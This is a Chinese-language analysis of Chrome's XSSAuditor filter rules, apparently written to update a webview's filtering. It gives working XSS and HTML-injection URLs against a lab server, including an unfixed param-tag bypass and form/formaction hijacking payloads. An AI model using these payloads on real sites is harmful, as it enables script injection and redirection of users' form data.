## XSSAuditor  https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
 

XSSAuditor现有过滤规则  分别用firefox跟chrome访问以下链接。 这些是chrome目前的过滤规则

目前存在的漏洞

[官方已修复的(还未合到我们的webview)](#script)
[官方未修复](#param)

后续根据xss_filter_evasion_cheat_sheet来更新规则。


## ScriptToken

*  startTag 检测 首先检测 startTag的name是否在url中 
	* src
	src attribute过滤 规则

			如果是同域并且没有query(?后面的) 那么就不会过滤，其它都会过滤

				http://10.129.193.58:8080/test.php?name=<script src='test.js'></script> 
				http://10.129.193.58:8080/test.php?name=<script src='test.js?t=1'></script>                                                                    
				http://10.129.193.58:8080/test.php?name=<script src='http://10.129.193.59/test.js'></script>
				http://10.129.193.58:8080/test.php?name=<script src='http://10.129.193.59/test.js?t=1'></script>

	* svg:href
			在svg嵌入的脚本，被检测到有svg::href属性也会拦截  chrome会拦截  tips: <script></script>在chrome下必须闭合 firefox不需要
			
				http://10.129.193.58:8080/test.php?name='<svg><circle cx='100' cy='50' r='40' stroke='black' stroke-width='2' fill='red'/><script href='test.js' type='text/javascript'></script>'
				
	* xlink:href
			在svg嵌入的脚本中，被检测到有 xlink:href也会被拦截
			
				http://10.129.193.58:8080/test.php?name='<svg><circle cx='100' cy='50' r='40' stroke='black' stroke-width='2' fill='red'/><script xlink:href='test.js' type='text/javascript'></script>'

	
* 如果script开始标签后面不是endTag 继续过滤 script标签中的内容  如果内容在url中检测到
   就会触发xss
  <h4 id="script">漏洞已修复</h4>
   
		 http://10.129.193.58:8080/xss.php?html_xss=%3Cscript%3Ealert(hacked)%0a--%3E // chrome60已修复
		 http://10.129.193.58:8080/test.php?name=%3c%62%72%3e%00%00%00%00%00%00%00%00%00<ScriPt>ALeRt('hacked')</scriPt> // chrome60已修复
		 http://10.129.193.58:8080/test.php?name=%3c%62%72%3e%00%00%00%00%00%00%00%00%00%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e // chrome60已修复
		 
    
## ObjectToken

* startTag 检测  首先检测 startTag的name是否在url中
	* data属性
	data 属性过滤规则
  跟src不一样的是，不管同源还是不同源xss全都拦截了

			http://10.129.193.58:8080/test.php?name=<object data='inject.html'></object>
			
  ![objectinject](https://wanghui0720.github.io/objectinject.png  "objectinject")
			
	* type属性
	  简单删除type属性
	  
	  		http://10.129.193.58:8080/test.php?name=<object type='text/html'><h1>我是注入的</h1> </object>
	  	
		这种用法chrome不适用
	* classid属性
	  简单删除classid属性
	  classid 可以是注册到本机上的，也可以通过url来标识， 所以也要过滤掉
	 
		
  object标签以上三个条件满足之一就会拦截
       
## ParamToken  
<h4 id="param">漏洞未修复</h4>

* startTag 检测 首先检测 startTag的name是否在url中
	* 必须是url param才拦截  可以看到我写的name=url 也给识别了。。
	
			bool HTMLParamElement::IsURLParameter(const String& name) {
		 	 return DeprecatedEqualIgnoringCase(name, "data") ||
			 DeprecatedEqualIgnoringCase(name, "movie") ||
			 DeprecatedEqualIgnoringCase(name, "src");
			 
	 可以看到url也可以取url的值
			 
			if (url_.IsEmpty() && (DeprecatedEqualIgnoringCase(name, "src") ||
                           DeprecatedEqualIgnoringCase(name, "movie") ||
                           DeprecatedEqualIgnoringCase(name, "code") ||
                           DeprecatedEqualIgnoringCase(name, "url"))) {
     			 url_ = StripLeadingAndTrailingHTMLSpaces(p->Value());
   			}
   
   我们构建以下url


		  http://10.129.193.58:8080/test.php?name=<object><param name='url' value='inject.html'></param></object>
			
      ![objectinject](https://wanghui0720.github.io/objectinject.png  "objectinject")
			
## EmbedToken
* startTag检测 首先检测 startTag的name是否在url中
	* code 属性 已经不支持了 
	
			https://html.spec.whatwg.org/#the-embed-element
			
	* src 属性 如果同源没有query不会拦截 如果不同源 或者 同源有query 会拦截
	
		同源不过滤
		
			http://10.129.193.58:8080/test.php?name=<embed src='inject.html'>
			

		不同源过滤
		
			http://10.129.193.58:8080/test.php?name=<embed src='inject.html?t=1'>
			http://10.129.193.58:8080/est.php?name=<embed src='inject.html'>
			
		![block](https://wanghui0720.github.io/block.png  "block")
			
	* type属性 
		
			http://10.129.193.58:8080/test.php?name=<embed type='text/html'><h1>我是注入的</h1></embed>
			
## FrameToken

* startTag 检测 首先检测 startTag的name是否在url中
  * srcdoc属性
      
      		    http://10.129.193.58:8080/test1.php?name=<iframe srcdoc='<h1>我是注入的</h1>'>
      		
![frameinject](https://wanghui0720.github.io/frameinject.png  "frameinject")

  * src属性
  
       		    http://10.129.193.58:8080/test1.php?name=<iframe src='inject.html'>

![frameinject](https://wanghui0720.github.io/frameinject.png  "frameinject")
      
## MetaToken
* startTag 检测 首先检测 startTag的name是否在url中
	* 检测废除的meta属性  set-cookie  refresh
	
			http://10.129.193.58:8080/test.php?name=<meta http-equiv='Set-Cookie' content='cookievalue=xxx; expires=Friday, 12-Jan-2001 18:18:18 GMT; path=/'/>>
			
## BaseToken
* startTag 检测 首先检测 startTag的name是否在url中
	* 检测src属性  html文档中所有的相对路径的文件都会根据此基准位置来加载
	
			http://10.129.193.58:8080/test.php?name=<base href='定义基准位置'>
			
## FormToken
* startTag检测 首先检测 startTag的name是否在url中
       * 检测 action属性
       
       我们有以下php页面
       
			echo "<form action='./test.php' name='$formurl'>";
			echo "First name:<br>";
			echo "<input type='text' name='firstname' value='Mickey'>";
			echo "<br>";
			echo "Last name:<br>";
			echo "<input type='text' name='lastname' value='Mouse'>";
			echo "<br><br>";
			echo "<input type='submit' value='Submit'>";
			echo "</form>";
			echo "<p>点击提交本来数据应该发向test.php</p>";
			
我们可以看到页面直接把formurl这个参数当做name属性，所以如果我们构造以下url， 就可以把action属性改为我们自己的地址
	 
	 		http://10.129.193.58:8080/test.php?formurl='><form action='test1.php'>
	 		
![form](https://wanghui0720.github.io/form.png  "form")
                   
## InputToken
* startTag 检测 首先检测 startTag的name是否在url中
	* 检测formaction 属性
	还是以上的php页面， 只不过我们多了一个input标签 并且有formaction属性， 还有个name属性 不小心用了url传过来的值
	
			echo "formurl is $formurl";
			echo "<form action='./test.php' name='$formurl'>";
			echo "First name:<br>";
			echo "<input type='text' name='firstname' value='Mickey'>";
			echo "<br>";
			echo "Last name:<br>";
			echo "<input type='text' name='lastname' value='Mouse'>";
			echo "<br><br>";
			echo "<input type='submit' value='Submit'>";
			echo "<input  formaction='test.php' name='$inputformaction' type='submit' value='Submit'>";
			echo "</form>";
			echo "<p>点击提交本来数据应该发向test.php</p>";
			
	然后我们构造以下 url
	
		http://10.129.193.58:8080/test.php?inputformaction=' style='display:none''><input formaction='test1.php' 
		
	访问之后我们会发现原来的input被我们注入的脚本隐藏了， 并新创建了一个input标签。而这个标签的formaction指向了我们自己的地址
	![formaction](https://wanghui0720.github.io/formaction.png  "formaction")

## ButtonToken
* startTag检测 首先检测 startTag的name是否在url中
	* 检测formaction属性  跟input标签一样

## LinkToken 
* startTag检测 首先检测 startTag的name是否在url中
	*  首先检测是否有rel属性并且值是import
	* 然后检测href属性 如果有href属性就会把href属性替换为 "data:" 

  	link标签的rel import属性目前firefox不支持 chrome支持， import可以导入一个html文档到另一个文档中，但是是隐藏的，如果想要显示在html文档中，需要用js加载，以下脚本就是用来加载import的html文档中的id为content的元素到宿主文档中
  	
		echo "<script>var getImport=document.querySelector('link[rel=import]');";          
		echo "var getContent=getImport.import.querySelector('#content');";              
		echo "document.body.appendChild(document.importNode(getContent, true))</script>";
		
	然后我们构造以下url
	
	 	http://10.129.193.58:8080/test.php?name='<link rel='import' href='test1.html'>'
	 	
	这样我们的文档就可以被宿主文档导入
	
	正常显示：
	![linkrel_normal](https://wanghui0720.github.io/linkrel_normal.png  "linkrel_normal")
	
	导入后显示
	
	![linkrel](https://wanghui0720.github.io/linkrel.png  "linkrel")
